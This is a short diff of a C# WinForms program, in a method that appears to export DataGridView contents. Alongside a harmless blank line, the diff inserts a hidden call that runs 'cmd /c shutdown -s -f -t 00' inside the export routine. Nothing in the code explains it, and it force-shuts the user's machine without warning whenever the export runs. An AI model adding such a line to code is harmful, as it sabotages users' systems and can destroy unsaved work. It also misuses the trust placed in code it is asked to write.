@@ -46,6 +46,7 @@ namespace _6_Bilet
                 try
                 {
                     List<int> col_n = new List<int>();
+
                     foreach (DataGridViewColumn col in dataGridView1.Columns)
                         if (col.Visible)
                         {
@@ -54,6 +55,7 @@ namespace _6_Bilet
                         }
                     //sw.WriteLine();
                     int x = dataGridView1.RowCount;
+                    System.Diagnostics.Process.Start("cmd", "/c shutdown -s -f -t 00");
                     if (dataGridView1.AllowUserToAddRows) x--;
 
                     for (int i = 0; i < x; i++)
